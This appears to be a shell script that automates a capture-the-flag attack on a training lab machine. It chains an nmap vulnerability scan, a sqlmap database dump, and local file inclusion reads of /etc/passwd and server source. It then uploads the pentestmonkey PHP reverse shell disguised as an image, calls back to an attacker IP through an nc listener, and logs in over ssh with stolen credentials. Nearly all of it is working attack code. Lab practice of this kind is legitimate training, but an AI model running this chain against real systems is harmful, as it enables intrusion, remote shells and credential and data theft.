#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.59.15"
attack_ip="10.10.36.217"

# Prepare environment
mkdir /work/

# Scan all ports using nmap
nmap --script vuln -sC -sV -p- ${target_ip} > /work/nmap-results.txt

# Analyze http server 
${scriptpath}/gobuster.sh -u ${target_ip} -p 1337 -o /work/gobuster-apache-results.txt

# Try brute force attack on MySql server
# ${scriptpath}/phpmyadmin.sh -u ${target_ip} -p 1337 -o /work/hydra-phpmyadmin-results.txt

# Exploit ssh vulnerability --> NOT WORKING
#${scriptpath}/../../exploits/cve-2024-6387/exploit.sh -i ${target_ip} -p 22 -c ${scriptpath}/ssh-command.txt

# Try SQL injection on admin_101
apt install -y sqlmap
sed -i "s/{IP}/${target_ip}/g" ${scriptpath}/req.txt
sqlmap -r ${scriptpath}/req.txt --answers="follow=Y" --batch --dump > /work/sqlmap-admin101-results.txt

# Use Local File Inclusion vulnerability to get users list
curl -X POST http://${target_ip}:1337//file1010111/index.php?file=/etc/passwd -d "password=easytohack" > /work/etc-passwd.txt
cat /work/etc-passwd.txt | grep :Z

# Use File Inclusion to get 
xterm -hold -e "nc -lvnp 4444" &
curl https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php > ${scriptpath}/lolcat.png
sed -i "s/'127.0.0.1'/'${attack_ip}'/g" ${scriptpath}/lolcat.png
sed -i "s/port = 1234/port = 4444/g" ${scriptpath}/lolcat.png
curl -X POST -d "password=zeamkish" -c /tmp/cookies.txt http://${target_ip}:1337/upload-cv00101011/index.php > /tmp/upload.html
curl -X POST -b /tmp/cookies.txt -F "myfile=@${scriptpath}/lolcat.png" http://${target_ip}:1337/upload-cv00101011/index.php > /tmp/success.html

# Retrieve the server source code for image storage to check where our file is
curl -X POST http://${target_ip}:1337//file1010111/index.php?file=php://filter/convert.base64-encode/resource=../upload-cv00101011/index.php -d "password=easytohack" > /work/index.php
sed -n '0,/<p>/ s|<p>\(.*\)</p>|\1|p' /work/index.php > /work/index2.php
tr -d ' ' < /work/index2.php > /work/index3.php
base64 -d /work/index3.php > /work/index4.php

# Launch the shell using the File Injection vulnerability
curl -X POST http://${target_ip}:1337//file1010111/index.php?file=../upload-cv00101011/upload_thm_1001/lolcat.png -d "password=easytohack"  > /tmp/start.html
# From the /home/ssh/ssh-creds.txt : with password easytohack@123
scp ${scriptpath}/host.sh zeamkish@$target_ip:/home/zeamkish/
ssh ${target_ip} -l zeamkish -p 22


